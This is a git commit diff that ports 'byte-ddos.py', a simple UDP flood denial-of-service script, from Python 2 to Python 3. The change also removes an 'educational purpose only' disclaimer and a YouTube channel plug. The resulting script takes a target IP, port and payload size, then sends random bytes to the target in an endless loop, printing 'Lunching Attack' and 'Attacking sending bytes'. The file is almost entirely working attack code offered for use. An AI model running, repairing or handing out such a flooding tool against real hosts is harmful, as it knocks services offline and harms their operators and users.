a3c90daff92ca2e6d18f41289140fd6fdb8e6ee1
Muhammed Shahil <77473229+muhammedshahil@users.noreply.github.com>
2023-09-05 02:11:02 +0530

    Update byte-ddos.py
    the issue with print has been fixed : KALI-LINUX OS USED

--- byte-ddos.py
+++ byte-ddos.py
@@ -4,86 +4,64 @@ import random
 import socket
 from sys import platform
 
-
-
-########################################
-########################################
-# Educational purpose only             #
-########################################
-# I'm not responsible for your actions #
-########################################
-########################################
-
-
-
-
-"""
-Created By: TheTechHacker
-==========================
-SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ
-
-"""
-
-
+# To run the script successfully, you can make this change throughout the script where print statements are used. Here's an updated version of the script with the necessary changes
 
 if platform == "linux" or platform == "linux2":
     os.system("clear")
 elif platform == "darwin":
     os.system("clear")
-    print "This Script Works Best on Kali linux"
+    print("This Script Works Best on Kali linux")
 elif platform == "win32":
     os.system("cls")
 else:
-    print "\033[1;34m [-]Unknown System Detected \033[1;m"
+    print("\033[1;34m [-]Unknown System Detected \033[1;m")
 
-print "\033[1;32m"
+print("\033[1;32m")
 
 connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-print """
+print("""
      _      _      _
     (.)< __(.)> __(.)=
   \___)  \___)  \___)   Ready To Send
-  
-  
+
+
 =======================================
      Created By: TheTechHacker
 =======================================
 If You Use too much bytes 
 You're Internet might get a bit slow
 =======================================
-"""
-
-
+""")
 
 try:
-    size = input("bytes> ")
+    size = int(input("bytes> "))
     attack = random._urandom(size)
-    ip = raw_input("IP> ")
-    port = input("port> ")
-    print " "
-    print "Lunching Attack"
-    print " "
+    ip = input("IP> ")
+    port = int(input("port> "))
+    print(" ")
+    print("Lunching Attack")
+    print(" ")
 except SyntaxError:
-    print " "
+    print(" ")
     exit("\033[1;34m ERROR \033[1;m")
 except NameError:
-    print " "
+    print(" ")
     exit("\033[1;34m Invalid Input \033[1;m")
 except KeyboardInterrupt:
-    print " "
+    print(" ")
     exit("\033[1;34m [-]Canceled By User \033[1;m")
 except ImportError:
-    print " "
+    print(" ")
     exit("\033[1;34m [-]Install python 2.7.15")
-
 
 while True:
     try:
         connect.sendto(attack, (ip, port))
-        print "Attacking sending bytes ===>"
+        print("Attacking sending bytes ===>")
     except KeyboardInterrupt:
-        print " "
+        print(" ")
         exit("\033[1;34m [-]Canceled By User \033[1;m")
     except ImportError:
-        print " "
+        print(" ")
         exit("\033[1;34m [-]Install python 2.7.15")
+
